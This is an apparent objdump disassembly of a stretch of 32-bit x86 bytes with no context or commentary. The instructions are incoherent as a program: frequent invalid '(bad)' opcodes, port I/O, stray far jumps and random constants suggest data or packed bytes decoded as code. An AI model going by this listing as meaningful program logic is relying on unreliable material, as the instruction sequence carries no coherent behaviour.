  412cba:	xor    edx,DWORD PTR [esi-0x3e2aca0b]
  412cc0:	mov    BYTE PTR [ecx-0x15],dh
  412cc3:	cwde   
  412cc4:	test   DWORD PTR [ecx-0x6b4bf1a1],0xf41b9285
  412cce:	bound  eax,QWORD PTR [ebx-0x715e70d0]
  412cd4:	adc    cl,BYTE PTR [edi+ebx*1]
  412cd7:	ret    
  412cd8:	jmp    DWORD PTR [edx+0x3]
  412cdb:	mov    al,0xd2
  412cdd:	jo     0x412c62
  412cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce0:	loopne 0x412ce7
  412ce2:	and    al,0x6
  412ce4:	mov    eax,0x618aa1e2
  412ce9:	push   ecx
  412cea:	iret   
  412ceb:	das    
  412cec:	rol    BYTE PTR [esi],cl
  412cee:	sbb    eax,ecx
  412cf0:	ret    
  412cf1:	ja     0x412c7c
  412cf3:	je     0x412cc7
  412cf5:	dec    esi
  412cf6:	lods   al,BYTE PTR ds:[esi]
  412cf7:	(bad)  
  412cf8:	out    dx,al
  412cf9:	lds    eax,FWORD PTR [edx]
  412cfb:	(bad)  
  412cfd:	adc    DWORD PTR [ebx-0x66662965],ebp
  412d03:	std    
  412d04:	mov    al,ds:0xd1728460
  412d09:	outs   dx,DWORD PTR ds:[esi]
  412d0a:	jno    0x412d25
  412d0c:	add    al,0xbd
  412d0e:	push   ds
  412d0f:	scas   eax,DWORD PTR es:[edi]
  412d10:	inc    edx
  412d11:	test   DWORD PTR [edx],0x1cf4ba88
  412d17:	out    dx,eax
  412d18:	cmp    al,0x31
  412d1a:	int3   
  412d1b:	fcmovbe st,st(2)
  412d1d:	jne    0x412d4b
  412d1f:	jmp    0x412d3a
  412d21:	xchg   eax,ecx
  412d23:	inc    ecx
  412d24:	jmp    0xa6feec3a
  412d29:	(bad)
  412d2e:	test   al,dl
  412d30:	int3   
  412d31:	test   eax,0x68146e5
  412d36:	fmul   QWORD PTR [esi+0xac3cba7]
  412d3c:	mov    WORD PTR [eax+0x47],fs
  412d3f:	xchg   ecx,eax
  412d40:	rcr    BYTE PTR [ebx],cl
  412d42:	mov    al,ds:0x8ab216f9
  412d47:	inc    eax
  412d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d49:	adc    DWORD PTR [edx-0x32169905],esi
  412d4f:	inc    esi
  412d50:	popa   
  412d51:	push   0xfffffffb
  412d53:	mov    cl,0x5e
  412d55:	push   edx
  412d56:	sub    DWORD PTR [ebx],0x5
  412d59:	xchg   ecx,eax
  412d5a:	mov    dl,0x8
  412d5c:	adc    ah,BYTE PTR [edx]
  412d5e:	mov    WORD PTR [esi-0x68ba751b],cs
  412d64:	pop    es
  412d65:	ds pop edx
  412d67:	inc    ecx
  412d68:	(bad)  
  412d69:	mov    dh,0xb1
  412d6b:	inc    esi
  412d6c:	xchg   edx,eax
  412d6d:	mov    eax,0x615e9572
  412d72:	sbb    DWORD PTR [ebx+0x5e8445b1],ebp
  412d78:	fnsave [ebp-0x6b]
  412d7b:	and    eax,0x5a8598ae
  412d80:	xchg   esi,eax
  412d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d82:	pusha  
  412d83:	sbb    ebp,ebp
  412d85:	inc    edx
  412d86:	cdq    
  412d87:	mov    fs,ecx
  412d89:	sub    edi,edx
  412d8b:	popa   
  412d8c:	inc    ebx
  412d8d:	call   0x53f7643f
  412d92:	sub    BYTE PTR [esi],bl
  412d94:	rcr    DWORD PTR [ecx+ecx*4],0x74
  412d98:	mov    bh,0x51
  412d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9b:	test   DWORD PTR [ebp-0xd],ebp
  412d9e:	sub    eax,0x8479c2ae
  412da3:	arpl   cx,sp
  412da5:	lock push ebp
  412da7:	pusha  
  412da8:	inc    eax
  412da9:	ja     0x412d2f
  412dab:	push   ss
  412dac:	mov    esi,0xe8941d83
  412db1:	repz xchg esp,eax
  412db3:	mov    ds,ebx
  412db5:	dec    esp
  412db6:	jno    0x412dd6
  412db8:	xor    ecx,DWORD PTR [edx]
  412dba:	mov    eax,DWORD PTR [ebp-0x1f22082e]
  412dc0:	dec    edi
  412dc1:	xchg   cl,bl
  412dc3:	cmp    DWORD PTR [ebp+0x4c54a81e],eax
  412dc9:	pop    ebx
  412dca:	inc    edx
  412dcb:	add    ebp,DWORD PTR [esi]
  412dcd:	bound  edx,QWORD PTR [ebp+0x44e0d296]
  412dd3:	sbb    esp,DWORD PTR [eax]
  412dd5:	into   
  412dd6:	mov    ss,WORD PTR [esi]
  412dd8:	push   ecx
  412dd9:	pop    ds
  412dda:	or     al,0x6a
  412ddc:	inc    ebx
  412ddd:	rcl    DWORD PTR [edx-0x66ba4509],cl
  412de3:	or     al,0xd2
  412de5:	(bad)  
  412de6:	pop    eax
  412de7:	push   edx
  412de8:	jl     0x412ddc
  412dea:	out    0x17,eax
  412dec:	stos   DWORD PTR es:[edi],eax
  412ded:	and    DWORD PTR [ecx],ebp
  412def:	and    al,0x32
  412df1:	and    bh,BYTE PTR [esi-0x25]
  412df4:	rcl    ah,cl
  412df6:	sti    
  412df7:	adc    DWORD PTR [esi],esp
  412df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dfa:	cmp    BYTE PTR [ebx+0x7],ch
  412dfd:	mov    ecx,0x136a8ef2
  412e02:	mov    esp,0xa468dd32
  412e07:	cli    
  412e08:	rcl    BYTE PTR [edi-0x20bdd8a],1
  412e0e:	lock pusha 
  412e10:	push   edx
  412e11:	mov    cl,0x87
  412e13:	jmp    0x25165535
  412e18:	push   edx
  412e19:	add    eax,DWORD PTR [edx-0x481668d9]
  412e1f:	in     al,dx
  412e20:	shl    BYTE PTR [ebp-0x37],cl
  412e23:	test   al,0x4a
  412e25:	xor    al,0x8b
  412e27:	push   edx
  412e28:	les    edi,FWORD PTR [edi]
  412e2a:	push   ebx
  412e2b:	lea    esi,[esi]
  412e2d:	pop    ss
  412e2e:	das    
  412e2f:	xor    BYTE PTR [edx-0x69],0x90
  412e33:	pop    es
  412e34:	gs loop 0x412dbc
  412e37:	loope  0x412e28
  412e39:	vpsadbw xmm2,xmm5,XMMWORD PTR [ebp-0x3f]
  412e3e:	mov    bh,0x68
  412e40:	or     dl,BYTE PTR [ecx]
  412e42:	mov    esi,0x33a00f16
  412e47:	les    eax,FWORD PTR [edi-0x1d]
  412e4a:	test   DWORD PTR [eax+0x69],edi
  412e4d:	mov    bh,0x1e
  412e4f:	(bad)
  412e53:	push   ds
  412e54:	sub    al,BYTE PTR [edi]
  412e56:	push   esi
  412e57:	aam    0x75
  412e59:	fimul  WORD PTR ds:0x3f5f8115
  412e5f:	(bad)  
  412e60:	shr    BYTE PTR [edi-0x4dbfe309],cl
  412e66:	add    DWORD PTR [ebp+0x1941e42],edx
  412e6c:	jge    0x412dfb
  412e6e:	enter  0x3f30,0x9f
  412e72:	push   ecx
  412e73:	and    dl,dl
  412e75:	mov    esp,0xffe005d1
  412e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e7b:	cld    
  412e7c:	xor    al,0x11
  412e7e:	int    0x90
  412e80:	fisub  DWORD PTR [ebp+0x6c1d94f8]
  412e86:	or     al,0x97
  412e88:	fst    DWORD PTR [ebx-0x6627a5aa]
  412e8e:	test   al,cl
  412e90:	push   ebp
  412e91:	adc    al,0x54
  412e93:	shl    DWORD PTR [edx],0x8d
  412e96:	push   esp
  412e97:	sti    
  412e98:	fild   WORD PTR ds:0x113557bb
  412e9e:	out    dx,eax
  412e9f:	or     BYTE PTR [ebx-0x9],0x45
  412ea3:	aas    
  412ea4:	ins    DWORD PTR es:[edi],dx
  412ea5:	(bad)  
  412ea6:	cmp    eax,0x37090f71
  412eab:	xor    BYTE PTR [esi],bl
  412ead:	adc    edi,esi
  412eaf:	int    0xfc
  412eb1:	scas   eax,DWORD PTR es:[edi]
  412eb2:	or     BYTE PTR [ebx-0x5f7ad421],al
  412eb8:	dec    eax
  412eb9:	push   ebx
  412eba:	mov    al,ds:0xb9dc222c
  412ebf:	xchg   ebp,eax
  412ec0:	cwde   
  412ec1:	jne    0x412e69
  412ec3:	dec    ebp
  412ec4:	shl    BYTE PTR [edx+0x42],cl
  412ec7:	and    ah,BYTE PTR [ecx+0xd0f847f]
  412ecd:	mov    al,ds:0x51fce7dc
  412ed2:	xor    eax,0x8090ab9f
  412ed7:	or     eax,0x2ffc2192
  412edc:	clc    
  412edd:	test   eax,0x4a122c88
  412ee2:	in     al,dx
  412ee3:	pusha  
  412ee4:	iret   
  412ee5:	adc    DWORD PTR [edi+0x4b],eax
  412ee8:	imul   ebp,DWORD PTR [edi],0xfffffff2
  412eeb:	(bad)  
  412eec:	fiadd  WORD PTR [ebp-0x7b]
  412eef:	jns    0x412eb4
  412ef1:	popa   
  412ef2:	sub    al,BYTE PTR [edx-0x48]
  412ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef6:	gs in  eax,dx
  412ef8:	es es js 0x412eb7
  412efc:	test   eax,0x6e244766
  412f01:	scas   al,BYTE PTR es:[edi]
  412f02:	ds dec ebp
  412f04:	stc    
  412f05:	mov    ch,0x85
  412f07:	jne    0x412e8e
  412f09:	test   al,0xb
  412f0b:	(bad)  
  412f0d:	fild   QWORD PTR [ebp+0x7308b18e]
  412f13:	push   edx
  412f14:	push   esp
  412f15:	or     eax,0x53d22a59
  412f1a:	int    0x4a
  412f1c:	shl    DWORD PTR [eax],0x97
  412f1f:	jae    0x412f01
  412f21:	bound  esp,QWORD PTR [edi+edi*4+0x13]
  412f25:	pop    ss
  412f26:	ins    BYTE PTR es:[edi],dx
  412f27:	pushf  
  412f28:	ret    
  412f29:	xchg   ecx,eax
  412f2a:	cld    
  412f2b:	xchg   ebx,eax
  412f2c:	xor    ah,BYTE PTR [esi+eiz*8+0x2dc349dd]
  412f33:	aam    0x93
  412f35:	adc    esp,ecx
  412f37:	jnp    0x412f09
  412f39:	cdq    
  412f3a:	jae    0x412fa0
  412f3c:	xchg   ebp,eax
  412f3d:	adc    edx,edx
  412f3f:	fcomp  DWORD PTR [eax+0x61]
  412f42:	add    eax,0x84dcb44d
  412f47:	xchg   DWORD PTR [eax+0x6e],esp
  412f4a:	out    0x27,al
  412f4c:	push   edx
  412f4d:	gs out dx,al
  412f4f:	enter  0x11ab,0x7f
  412f53:	leave  
  412f54:	mov    esp,0x93a80a83
  412f59:	rol    DWORD PTR [ebp-0x5cca7b5a],1
  412f5f:	retf   
  412f60:	inc    edx
  412f61:	repz sahf 
  412f63:	xchg   ebx,eax
  412f64:	xor    cl,cl
  412f66:	ja     0x412f99
  412f68:	or     bh,bh
  412f6a:	lods   eax,DWORD PTR ds:[esi]
  412f6b:	popf   
  412f6c:	loopne 0x412f79
  412f6e:	mov    edi,DWORD PTR [ecx+eiz*4]
  412f71:	(bad)  [eax+0x27491029]
  412f77:	cli    
  412f78:	jmp    0x412f8a
  412f7a:	pop    eax
  412f7b:	mov    ecx,0x7d9302e
  412f80:	push   0xfffffff4
  412f82:	jecxz  0x412fa2
  412f84:	rcr    BYTE PTR [esi-0x34],cl
  412f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f88:	xchg   DWORD PTR [esi+edx*1],edi
  412f8b:	jne    0x412f19
  412f8d:	adc    DWORD PTR [eax-0x47cd90a1],ebx
  412f93:	adc    eax,0xc88af399
  412f98:	add    BYTE PTR [ebp+0x5bd7c0a7],ch
  412f9e:	pusha  
  412f9f:	sub    DWORD PTR [esi-0x2bfca5ef],edx
  412fa5:	aam    0xf1
  412fa7:	cmp    edx,ebp
  412fa9:	jbe    0x412f33
  412fab:	ss sbb al,0x9c
  412fae:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412fb0:	mov    eax,0x1d709583
  412fb5:	lahf   
  412fb6:	sbb    edi,eax
  412fb8:	gs push ds
  412fba:	iret   
  412fbb:	sbb    BYTE PTR [ebx-0x5c],ch
  412fbe:	adc    edi,ecx
  412fc0:	sub    DWORD PTR [esi-0x7c],esi
  412fc3:	xchg   ebx,eax
  412fc4:	(bad)  
  412fc5:	jbe    0x413022
  412fc7:	xchg   esp,eax
  412fc8:	cmp    BYTE PTR [edi-0x3fc5719f],0x3d
  412fcf:	mov    bl,0xfa
  412fd1:	inc    ebp
  412fd2:	clc    
  412fd3:	or     bl,dl
  412fd5:	(bad)  
  412fd6:	xchg   esp,eax
  412fd7:	fst    DWORD PTR [eax-0x65cc1662]
  412fdd:	xor    DWORD PTR [edx-0x47fe472],0x50
  412fe4:	mov    eax,ds:0xe540651c
  412fe9:	xchg   ebp,eax
  412fea:	jl     0x412f79
  412fec:	shl    ah,1
  412fee:	xlat   BYTE PTR ds:[ebx]
  412fef:	adc    edi,DWORD PTR [ebx+0x2751bde9]
  412ff5:	adc    DWORD PTR [edi+0x3663002c],edi
  412ffb:	or     dh,al
  412ffd:	pop    esp
  412ffe:	test   bl,bl
  413000:	xor    eax,0x88b5c202
  413005:	push   cs
  413006:	fstp   DWORD PTR [esp+0x11]
  41300a:	(bad)  
  41300b:	mov    ds:0x79557604,eax
  413010:	mov    eax,ds:0x5388598
  413015:	imul   esp,DWORD PTR [edx-0x4fa5c2c2],0xd3110f67
  41301f:	jb     0x41300a
  413021:	out    dx,al
  413022:	nop
  413023:	push   ss
  413024:	mov    al,0xe4
  413026:	and    eax,0x85b90739
  41302b:	inc    ebp
  41302c:	sar    BYTE PTR [eax-0x3b9f3aee],1
  413032:	cwde   
  413033:	out    dx,al
  413034:	mov    edx,0x5a6a3c11
  413039:	fldenv [ebx]
  41303b:	test   al,0x1f
  41303d:	pop    edx
  41303e:	test   BYTE PTR [ebx],al
  413040:	mov    bl,0xf5
  413042:	addr16 out 0xd4,eax
  413045:	cdq    
  413046:	outs   dx,DWORD PTR ds:[esi]
  413047:	mov    fs,ebp
  413049:	lar    ecx,cx
  41304c:	aad    0x30
  41304e:	leave  
  41304f:	dec    eax
  413050:	lods   eax,DWORD PTR ds:[esi]
  413051:	sbb    eax,0xab5aad68
  413056:	ror    esi,cl
  413058:	das    
  413059:	sub    dh,al
  41305b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41305c:	mul    BYTE PTR [edx]
  41305e:	dec    esp
  41305f:	xchg   edx,eax
  413060:	and    DWORD PTR [edx-0x74],esi
  413063:	xchg   BYTE PTR [ecx+edx*2-0x7f3f9289],cl
  41306a:	test   DWORD PTR [edi+eax*1-0x1ac4c1ae],edi
  413071:	leave  
  413072:	test   al,0xde
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	adc    ah,al
  413077:	push   esi
  413078:	icebp  
  413079:	enter  0x99ff,0xd2
  41307d:	std    
  41307e:	rcl    DWORD PTR [eax-0x74755cb7],1
  413084:	jecxz  0x4130a4
  413086:	shl    DWORD PTR ds:0x53a221ce,0xba
  41308d:	inc    esp
  41308e:	inc    esp
  41308f:	xchg   ebx,eax
  413090:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413092:	test   BYTE PTR [eax+0x42],ah
  413095:	loop   0x4130fb
  413097:	xor    BYTE PTR [edx+0x390ed230],al
  41309d:	adc    DWORD PTR [edx+0x41a262c0],eax
  4130a3:	ds push 0x5bfe847f
  4130a9:	xchg   eax,esi
  4130ab:	lds    ebx,FWORD PTR ds:0x115d6b33
  4130b1:	adc    DWORD PTR [ebx],edx
  4130b3:	repnz int 0x1c
  4130b6:	cmc    
  4130b7:	add    cl,BYTE PTR [edi-0x6]
  4130ba:	test   esp,ecx
  4130bc:	adc    ebx,edi
  4130be:	sub    bh,BYTE PTR [ebx]
  4130c0:	jp     0x413107
  4130c2:	fmul   DWORD PTR [esi-0x1afe6eb2]
  4130c8:	(bad)  
  4130c9:	lods   al,BYTE PTR ds:[esi]
  4130ca:	(bad)  
  4130cb:	ins    DWORD PTR es:[edi],dx
  4130cc:	inc    edx
  4130cd:	sub    al,0xee
  4130cf:	inc    esi
  4130d0:	pop    ss
  4130d1:	out    0x45,eax
  4130d3:	fnstsw WORD PTR [edx+ebp*1]
  4130d6:	lds    eax,FWORD PTR [ecx+0x26]
  4130d9:	adc    DWORD PTR [eax+0x77],edx
  4130dc:	and    DWORD PTR [ebx+esi*4-0x2b],esp
  4130e0:	nop
  4130e1:	sub    esp,0x40
  4130e4:	jmp    0x987e:0x76963fe2
  4130eb:	xchg   DWORD PTR [esi-0x68],ebp
  4130ee:	inc    eax
  4130ef:	fwait
  4130f0:	adc    eax,0x52b2d181
  4130f5:	stos   BYTE PTR es:[edi],al
  4130f6:	out    0xf8,eax
  4130f8:	mov    bl,0x30
  4130fa:	mov    ch,BYTE PTR [ecx]
  4130fc:	and    edx,edx
  4130fe:	cmc    
  4130ff:	stos   BYTE PTR es:[edi],al
  413100:	push   edx
  413101:	lods   al,BYTE PTR ds:[esi]
  413102:	pop    ecx
  413103:	rcr    BYTE PTR [ecx+0x5c0c1e10],cl
  413109:	jp     0x4130a6
  41310b:	xchg   edx,eax
  41310c:	push   edx
  41310d:	inc    ebp
  41310e:	push   edx
  41310f:	into   
  413110:	rcl    BYTE PTR [edx+0x78],cl
  413113:	pop    esp
  413114:	out    dx,al
  413115:	loope  0x4130c7
  413117:	mov    dh,0x54
  413119:	push   ds
  41311a:	loopne 0x4130c9
  41311c:	push   es
  41311d:	and    BYTE PTR [edi+edi*1],0xd7
  413121:	sub    BYTE PTR [ebx-0x2b],ah
  413124:	rol    BYTE PTR [edx+esi*8],1
  413127:	mov    bh,ah
  413129:	xor    DWORD PTR [ecx+edx*4-0x47],ebx
  41312d:	xchg   ebp,eax
  41312e:	in     eax,0x8e
  413130:	(bad)  
  413131:	sbb    al,0x72
  413133:	or     ebx,DWORD PTR [eax+edx*8+0x52]
  413137:	leave  
  413138:	idiv   BYTE PTR [edi+ecx*1-0x11]
  41313c:	rol    BYTE PTR ds:0xe84719f6,cl
  413142:	add    edx,esi
  413144:	pop    ebp
  413145:	push   ds
  413146:	and    DWORD PTR [eax+esi*1+0x4f],edi
  41314a:	mov    ds:0x853384da,al
  41314f:	mov    ch,0x17
  413151:	fdiv   DWORD PTR [edi]
  413153:	xchg   ebp,eax
  413154:	arpl   WORD PTR [ebp-0x3ff5717c],si
  41315a:	(bad)  
  41315c:	out    0xa,eax
  41315e:	fwait
  41315f:	pop    edi
  413160:	sar    BYTE PTR [ecx],cl
  413162:	inc    edi
  413163:	dec    esp
  413164:	cmp    eax,0x8bb79f44
  413169:	adc    DWORD PTR [ebx+0x39],ebx
  41316c:	sbb    ebx,DWORD PTR [eax-0x65545a4d]
  413172:	test   dh,cl
  413174:	jnp    0x413143
  413176:	mov    DWORD PTR [eax],esi
  413178:	inc    edx
  413179:	pop    ss
  41317a:	repnz mov bl,0x60
  41317d:	and    eax,0x38537571
  413182:	sahf   
  413183:	imul   eax,DWORD PTR [eax+0x1d],0x74
  413187:	into   
  413188:	clc    
  413189:	dec    BYTE PTR [eax+0x378ba30c]
  41318f:	pushf  
  413190:	push   ebp
  413191:	(bad)  
  413192:	mov    al,ds:0x2291b6a4
  413197:	mov    dh,0xf6
  413199:	inc    edi
  41319a:	mov    dl,0x98
  41319c:	and    ah,dh
  41319e:	adc    bh,BYTE PTR [edx+0x72]
  4131a1:	retf   0xd17d
  4131a4:	sbb    eax,0xe128f1ec
  4131a9:	mov    al,0xae
  4131ab:	mov    ?,esi
  4131ad:	xchg   BYTE PTR [edi+edx*8],dl
  4131b0:	test   BYTE PTR [edi+0x37],0x2d
  4131b4:	das    
  4131b5:	xchg   esi,eax
  4131b6:	test   BYTE PTR [eax+0x33cfde81],bl
  4131bc:	ror    BYTE PTR [edx-0x80],cl
  4131bf:	mov    ah,0x78
  4131c1:	jle    0x413147
  4131c3:	pop    ds
  4131c4:	mov    bl,0x6b
  4131c6:	call   0x973bdb5f
  4131cb:	add    BYTE PTR ds:[ecx+0x6e],ch
  4131cf:	stos   BYTE PTR es:[edi],al
  4131d0:	(bad)  
  4131d1:	in     al,dx
  4131d2:	add    eax,0x7dd4a245
  4131d7:	mov    ch,0xdc
  4131d9:	fadd   QWORD PTR [esp+ebx*2-0x41729168]
  4131e0:	add    bh,BYTE PTR [edx+0x1e4bd1c1]
  4131e6:	push   ss
  4131e7:	mov    ebx,0xeb60782d
  4131ec:	xor    al,0xa9
  4131ee:	test   DWORD PTR [edx-0x1b],eax
  4131f1:	or     BYTE PTR [ebp-0x1d],cl
  4131f4:	add    dh,BYTE PTR [ecx]
  4131f6:	sbb    eax,0x4d2cf78e
  4131fb:	call   0x51a1:0x631407c2
  413202:	jae    0x413266
  413204:	shl    DWORD PTR [ecx-0x5e79519e],cl
  41320a:	stos   DWORD PTR es:[edi],eax
  41320b:	into   
  41320c:	mov    dl,0x36
  41320e:	jl     0x4131a3
  413210:	pop    esi
  413211:	jecxz  0x4131b0
  413213:	loope  0x41327e
  413215:	nop
  413216:	gs mov eax,0xb185d429
  41321c:	leave  
  41321d:	cwde   
  41321e:	ss ret 0xd161
  413222:	push   ds
  413223:	mov    ds,ebx
  413225:	push   eax
  413226:	inc    edi
  413227:	icebp  
  413228:	jno    0x4131ff
  41322a:	sub    eax,0x591ed2f2
  41322f:	adc    ch,bl
  413231:	ret    
  413232:	dec    edi
  413234:	lods   al,BYTE PTR ds:[esi]
  413235:	jmp    0x5cee4836
  41323a:	(bad)  
  41323b:	shl    DWORD PTR [edx+0x51],1
  41323e:	or     al,0x6b
  413240:	xor    esi,DWORD PTR fs:0x85c89aef
  413247:	rol    BYTE PTR [edx+0x3c446bc7],0x7d
  41324e:	and    cl,BYTE PTR [ebp+0x7ae49576]
  413254:	jecxz  0x41320f
  413256:	out    0x6d,al
  413258:	scas   eax,DWORD PTR es:[edi]
  413259:	xor    al,0x5a
  41325b:	sahf   
  41325c:	xchg   esi,eax
  41325d:	mov    esi,0x4efb8edc
  413262:	mov    edi,0xd7cf096e
  413267:	and    edi,DWORD PTR [esi]
  413269:	mov    eax,0x35a94561
  41326e:	cld    
  41326f:	daa    
  413270:	aad    0xf9
  413272:	inc    ebp
  413273:	dec    esi
  413274:	cmp    DWORD PTR [edi-0x1b],ebx
  413277:	mov    edx,0x978eca08
  41327c:	in     eax,0x99
  41327e:	jbe    0x41320e
  413280:	(bad)  
  413281:	mov    al,ds:0xf6acbed2
  413286:	or     edx,DWORD PTR [esi+eax*1-0x57]
  41328a:	mov    eax,0x986d4ace
  41328f:	imul   ebx,DWORD PTR [ecx+0x36],0xffffffc8
  413293:	out    0xbe,al
  413295:	adc    edi,esp
  413297:	popf   
  413298:	sbb    bh,BYTE PTR [esi+ebx*8+0x4b]
  41329c:	xchg   ecx,eax
  41329d:	and    eax,DWORD PTR [ebp+0x37f54323]
  4132a3:	mov    ds:0xe4fd5ff6,al
  4132a8:	(bad)  
  4132a9:	or     eax,0x5f9b4032
  4132ae:	test   BYTE PTR [edx+0x72ce83dd],dh
  4132b4:	in     al,0xe3
  4132b6:	test   DWORD PTR [eax-0x9],edx
  4132b9:	stos   DWORD PTR es:[edi],eax
  4132ba:	pop    ss
  4132bb:	lahf   
  4132bc:	and    BYTE PTR [ecx+0x36288ee5],ah
  4132c2:	xor    edx,DWORD PTR [eax+0x3]
  4132c5:	aas    
  4132c6:	div    BYTE PTR [edi-0x2e]
  4132c9:	(bad)  
  4132ca:	xor    al,0xca
  4132cc:	stc    
  4132cd:	lods   eax,DWORD PTR ds:[esi]
  4132ce:	jb     0x413289
  4132d0:	inc    ebx
  4132d1:	push   ds
  4132d2:	(bad)  
  4132d3:	leave  
  4132d4:	pop    eax
  4132d5:	push   ebp
  4132d6:	cmp    bl,BYTE PTR [ebx]
  4132d8:	lds    ax,DWORD PTR [ebp-0x45aafd76]
  4132df:	dec    esp
  4132e0:	adc    ah,BYTE PTR [ebx-0xb437131]
  4132e6:	gs pop ecx
  4132e8:	mov    DWORD PTR [esi-0x55],ebx
  4132eb:	cmp    DWORD PTR [edx-0x25],esp
  4132ee:	test   DWORD PTR [edx-0x2e476ad9],ecx
  4132f4:	and    bl,BYTE PTR [ecx-0x6b]
  4132f7:	mov    cl,BYTE PTR [eax-0x28f1a89c]
  4132fd:	repz jnp 0x4132e2
  413300:	gs inc ebx
  413302:	test   BYTE PTR [edx+0x30e9a3b6],dl
  413308:	xchg   esp,eax
  413309:	mov    bh,BYTE PTR [ecx+0x1d3e9093]
  41330f:	push   esi
  413310:	sbb    DWORD PTR [edx-0x44],esi
  413313:	dec    esi
  413314:	lods   eax,DWORD PTR ds:[esi]
  413315:	out    0x85,al
  413317:	retf   0x8bc5
  41331a:	mov    ah,0xd9
  41331c:	stos   BYTE PTR es:[edi],al
  41331d:	call   0xf91:0x5a468e44
  413324:	xchg   esp,eax
  413325:	and    al,0x68
  413327:	mov    edx,0x1a9721d2
  41332c:	add    al,BYTE PTR [ebp-0xe]
  41332f:	or     BYTE PTR [esi+0x5a179011],bl
  413335:	icebp  
  413336:	ins    BYTE PTR es:[edi],dx
  413337:	fisub  WORD PTR [ebx-0x67]
  41333a:	mov    BYTE PTR [edx+0x2659715d],dh
  413340:	cmp    BYTE PTR [esi+0x22a7453d],ch
  413346:	in     eax,0xac
  413348:	jae    0x4133c2
  41334a:	ficom  DWORD PTR [ebp-0x357c726a]
  413350:	mov    al,ds:0x27b685b4
  413355:	inc    ecx
  413356:	inc    BYTE PTR [esp+eiz*2]
  413359:	push   ds
  41335a:	nop
  41335b:	int    0xc7
  41335d:	adc    edx,DWORD PTR [eax-0x6c]
  413360:	add    dl,al
  413362:	test   DWORD PTR [edx-0x76d19a71],eax
  413368:	sti    
  413369:	test   DWORD PTR [ebp-0x1159a86d],esi
  41336f:	pop    ecx
  413370:	dec    esi
  413371:	mov    ds:0x8b8e8d65,eax
  413376:	test   esi,esp
  413378:	fwait
  413379:	cmp    edi,ebx
  41337b:	idiv   DWORD PTR [edi+0x3a]
  41337e:	mov    cl,0x8d
  413380:	inc    ebx
  413381:	loop   0x41337a
  413383:	push   esp
  413384:	retf   
  413385:	mov    ecx,0xbc3dee9e
  41338a:	mov    dl,BYTE PTR [edx+0x6d]
  41338d:	pop    eax
  41338e:	ins    DWORD PTR es:[edi],dx
  41338f:	sub    al,0x7d
  413391:	push   es
  413392:	aad    0xba
  413394:	push   eax
  413395:	or     eax,0x2ae07d1
  41339a:	adc    cl,dh
  41339c:	or     BYTE PTR [ebp-0x9a9ab86],0x84
  4133a3:	jge    0x413373
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	and    eax,0x3f98a243
  4133ab:	xor    edi,DWORD PTR [ebx+0x38e38711]
  4133b1:	sbb    ecx,DWORD PTR [edi]
  4133b3:	hlt    
  4133b4:	les    eax,FWORD PTR ss:[ebx+esi*8+0x208488ca]
  4133bc:	bound  eax,QWORD PTR [ebx+ecx*4+0x3d]
  4133c0:	test   DWORD PTR [ecx],edx
  4133c2:	pop    ebp
  4133c3:	xlat   BYTE PTR ds:[ebx]
  4133c4:	jbe    0x413352
  4133c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c7:	stos   BYTE PTR es:[edi],al
  4133c8:	lock xchg ecx,eax
  4133ca:	test   eax,esi
  4133cc:	xchg   ecx,eax
  4133cd:	sar    BYTE PTR [edi],1
  4133cf:	adc    al,0xef
  4133d1:	lds    esp,FWORD PTR ds:0x511138ee
  4133d7:	dec    edi
  4133d8:	inc    ecx
  4133d9:	xchg   esp,eax
  4133da:	jbe    0x413400
  4133dc:	arpl   WORD PTR [edx-0x37cde67b],di
  4133e2:	call   0xfe8e:0xdb104461
  4133e9:	or     edx,DWORD PTR [eax+edi*4-0x79]
  4133ed:	mov    DWORD PTR [eax],eax
  4133ef:	(bad)  [edx+0x6c]
  4133f2:	sbb    ah,0x91
  4133f5:	jp     0x4133f7
  4133f7:	pop    es
  4133f8:	push   edx
  4133f9:	or     al,0xe6
  4133fb:	pop    ebp
  4133fc:	jnp    0x41341c
  4133fe:	mov    ebx,0x610eb74b
  413403:	xchg   DWORD PTR [esi-0x64],esi
  413406:	xchg   al,ch
  413408:	aam    0x17
  41340a:	push   ebx
  41340b:	imul   edx,DWORD PTR [edx+0x20],0x118f0905
  413412:	js     0x4133ce
  413414:	xchg   ecx,eax
  413415:	push   edi
  413416:	addr16 push esi
  413418:	xor    BYTE PTR [ebp+0x284f739],al
  41341e:	pop    eax
  41341f:	arpl   WORD PTR [edx],dx
  413421:	mov    esi,0x58ed06b
  413426:	lds    ecx,FWORD PTR [esi-0x6090fc65]
  41342c:	scas   al,BYTE PTR es:[edi]
  41342d:	(bad)  
  41342e:	aaa    
  41342f:	outs   dx,DWORD PTR ds:[esi]
  413430:	rcl    bl,cl
  413432:	sub    DWORD PTR [edx+0xe562736],ebp
  413438:	hlt    
  413439:	adc    ecx,ebp
  41343b:	stos   BYTE PTR es:[edi],al
  41343c:	fs dec ecx
  41343e:	in     eax,0x25
  413440:	mov    al,BYTE PTR [edx-0x7c]
  413443:	add    al,0x2b
  413445:	xor    DWORD PTR ds:0xd91f5dce,edx
  41344b:	mov    es,esp
  41344d:	or     eax,ecx
  41344f:	cs jns 0x413468
  413452:	fisub  DWORD PTR [ecx+ebp*4-0x6a]
  413456:	pop    ds
  413457:	repnz lock sub eax,0xcc9b1ee5
  41345e:	ror    BYTE PTR [esi+0x30c9bb1],cl
  413464:	out    0x5a,eax
  413466:	xor    esp,ebx
  413468:	ror    ch,cl
  41346a:	fdivr  QWORD PTR [ebx-0x3e]
  41346d:	fistp  QWORD PTR [ecx]
  41346f:	(bad)  
  413470:	fcom   DWORD PTR [ecx]
  413472:	test   al,0x8c
  413474:	mov    WORD PTR [ecx],?
